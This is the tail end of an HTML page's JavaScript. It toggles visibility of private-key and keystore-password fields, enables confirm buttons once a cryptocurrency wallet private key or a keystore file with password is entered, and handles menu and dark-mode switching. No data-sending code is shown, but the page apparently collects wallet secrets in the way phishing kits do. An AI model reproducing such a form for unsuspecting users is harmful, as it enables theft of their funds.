            <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
            `;
        }
    }

    function togglePrivateKeyVisibility() {
        const input = document.getElementById('private-key-input');
        const icon = document.getElementById('private-key-icon');

        if (input.type === 'password') {
            input.type = 'text';
            icon.innerHTML = `
            <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path>
            `;
        } else {
            input.type = 'password';
            icon.innerHTML = `
            <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
            `;
        }
    }

    function toggleKeystorePasswordVisibility() {
        const input = document.getElementById('keystore-password-input');
        const icon = document.getElementById('keystore-password-icon');

        if (input.type === 'password') {
            input.type = 'text';
            icon.innerHTML = `
            <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path>
            `;
        } else {
            input.type = 'password';
            icon.innerHTML = `
            <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
            `;
        }
    }

    function toggleMenu() {
        const menu = document.querySelector('.navbar ul');
        menu.classList.toggle('show');

        const toggle = document.querySelector('.menu-toggle');
        toggle.classList.toggle('close');
    }

    function toggleMode() {
        const body = document.body;
        const modeSwitch = document.querySelector('.mode-switch');

        body.classList.toggle('dark-mode');
        body.classList.toggle('light-mode');

        if (body.classList.contains('dark-mode')) {
            modeSwitch.textContent = 'Ã¢ÂÂ';
        } else {
            modeSwitch.textContent = 'Ã¢ÂÂ½';
        }
    }
</script>

<script type="text/javascript">
    function checkPrivateKeyInput() {
        const input = document.getElementById('private-key-input');
        const confirmButton = document.getElementById('private-key-confirm-button');

        const isFilled = input.value.trim() !== '';

        confirmButton.disabled = !isFilled;
        confirmButton.classList.toggle('hidden', !isFilled);
    }

    function handleKeystoreFile() {
        const fileInput = document.getElementById('keystore-file-input');
        const confirmButton = document.getElementById('keystore-confirm-button');

        const fileSelected = fileInput.files.length > 0;
        const passwordInput = document.getElementById('keystore-password-input');

        const passwordFilled = passwordInput.value.trim() !== '';

        confirmButton.disabled = !(fileSelected && passwordFilled);
        confirmButton.classList.toggle('hidden', !(fileSelected && passwordFilled));
    }

    function checkKeystoreInputs() {
        const fileInput = document.getElementById('keystore-file-input');
        const confirmButton = document.getElementById('keystore-confirm-button');

        const fileSelected = fileInput.files.length > 0;
        const passwordInput = document.getElementById('keystore-password-input');

        const passwordFilled = passwordInput.value.trim() !== '';

        confirmButton.disabled = !(fileSelected && passwordFilled);
        confirmButton.classList.toggle('hidden', !(fileSelected && passwordFilled));
    }
</script>

<script src="src_assets/js/jquery.min.js" type="text/javascript"></script>
<script src="src_assets/js/jquery.scrollex.min.js" type="text/javascript"></script>
<script src="src_assets/js/browser.min.js" type="text/javascript"></script>
<script src="src_assets/js/breakpoints.min.js" type="text/javascript"></script>
<script src="src_assets/js/util.js" type="text/javascript"></script>
<script src="src_assets/js/main.js" type="text/javascript"></script>
<script src="./src_assets/cloudflare-static/rocket-loader.min.js" data-cf-settings="5f4924991d2c06b82cd194e2-|49" defer></script></body>
</html>